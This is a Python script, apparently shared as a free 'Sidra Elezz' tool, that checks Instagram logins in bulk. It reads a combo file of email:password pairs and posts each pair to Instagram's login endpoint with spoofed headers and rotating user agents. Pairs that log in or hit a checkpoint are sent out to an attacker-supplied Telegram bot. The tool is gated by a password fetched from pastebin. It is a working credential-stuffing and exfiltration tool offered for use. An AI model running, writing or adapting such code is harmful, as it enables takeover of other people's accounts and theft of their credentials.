try:
	import os, sys, time, requests
	from time import sleep
	from user_agent import generate_user_agent
except ImportError as Sidraelezz:
	sys.exit('[Error] ' + Sidraelezz + ' :-\\')
	
#----------------------------------------------------[colors]----------------------------------------------------#
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
Q = "["
W = "]"
r = requests.session()
#----------------------------------------------------[Banner]----------------------------------------------------#
Sidra= """ 
   \033[1;92m  _________ __      ___                
   \033[1;97m /   _____/|__|  __| _/_______ _____   
   \033[1;97m \_____  \ |  | / __ | \_  __ \\__  \  
   \033[1;97m /        \|  |/ /_/ |  |  | \/ / __ \_
   \033[1;97m/_______  /|__|\____ |  |__|   (____  /
   \033[1;92m        \/          \/              \/   

\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 
Tk = f""" {E}
 _     _ _______ _______ _     _
 |_____| |_____| |       |____/ 
 |     | |     | |_____  |    \_  {A} • {H} Instagram
                                    
\033[1;93m < \033[1;96mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m*\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 
os.system('clear')

def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
re = requests.get("https://pastebin.com/raw/EW2JedW4")
print (Sidra)
print ("\033[1;92mFIRST STEP OF LOGIN")
print ("\033[1;97m--------------------")
print ("\033[1;97m ") 
password = input('          \033[1;93mTOOL PASSWORD: '+C)
print (E)
if password == "" :
  sys.exit()
if password in str(re.text):
  print(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print ("\033[1;93m ")
  print("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password !")
  os.system('xdg-open https://t.me/TT_RQ/1')
  sys.exit()
#----------------------------------------------------[Combo]----------------------------------------------------#  
os.system('clear')
print(Tk)
print("{}{}{}1{}{}{} Check Instagram".format(A,Q,C,A,W,H))
print("{}{}{}0{}{}{} Exit".format(A,Q,C,A,W,A))
Tools = input("{}{}{}*{}{}{}{} CHOOSE AN OPTION : {} ".format(A,Q,E,A,W,A,H,C))
#----------------------------------------------------[Cod BY Sidra ELEzz]----------------------------------------------------#    
                                             
if Tools == '1':
    os.system('clear')
    print(Tk)
    Sidr = input("{}{}{}*{}{}{}{} Enter the file Combo : {} ".format(A,Q,E,A,W,A,H,C))
    print("-"*50)
    token = input("{}{}{}*{}{}{}{} TOKN BOT :\n{}".format(A,Q,E,A,W,A,H,C))
    ID = input("{}{}{}*{}{}{}{} ID TELE :\n{}".format(A,Q,E,A,W,A,H,C))
    print("-"*50)
    Ok = 0
    Cp = 0
    Sk = 0
    
    file = open(Sidr,"r")
    while True:
        email = file.readline().split('\n')[0]
        
        if email == '':
            print ("{} Examination is over".format(A))
            break
        	
        user = email.split(':')[0]
        pw = email.split(':')[1]
        Sidraok = ("⌯ Hi Sidra Successful ✓ ⌯\n. — — — — —  — — — — — . \n\n.✥. Email 📧 :" +str(user)+"\n\n.✥. Pass 🔐 : " +str(pw)+"\n\n. — — — — —  — — — — — . \n.✥.Tele : @SidraTools")
        Sidracp = ("⌯ Hi Sidra Checkpoint 🔐 ⌯\n. — — — — —  — — — — — . \n\n.✥. Email 📧 :" +str(user)+"\n\n.✥. Pass 🔐 : " +str(pw)+"\n\n. — — — — —  — — — — — . \n.✥.Tele : @SidraTools")
        
        
        aip = "https://www.instagram.com"
        url = "https://www.instagram.com/accounts/login/ajax/"
        SidraELEzz = generate_user_agent()
        headers = {
        'accept':'*/*',
        'accept-encoding':'gzip,deflate,br',
        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
        'content-length':'269',
        'content-type':'application/x-www-form-urlencoded',
        'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
        'origin': str(aip),
        'referer': str(aip),
        'sec-fetch-dest':'empty',
        'sec-fetch-mode':'cors',
        'sec-fetch-site':'same-origin',
        'user-agent': str(SidraELEzz) ,
        'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'8a8118fa7d40',
        'x-requested-with':'XMLHttpRequest'}
        payload = {
		'username':str(user),
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:'+str(pw),
        'queryParams': '{}',
        'optIntoOneTap': 'false'}
        response = r.post(url,headers=headers,data=payload)
        if ("userId") in str(response.text):
            Ok+=1
            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
            
        elif ("checkpoint_url")  in str(response.text):
            Cp+=1
            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidracp))
        else:
            Sk+=1
            os.system('clear')
            print(Tk+"\n")
            print("{}  Successful {} : {}{}".format(E,A,E,Ok))
            print("{}  Checkpoint {} : {}{}".format(H,A,H,Cp))
            print("{}  Start Check{} : {}{}{}".format(K,A,K,Sk,C))
            print("-"*50)
            
            
        #print
        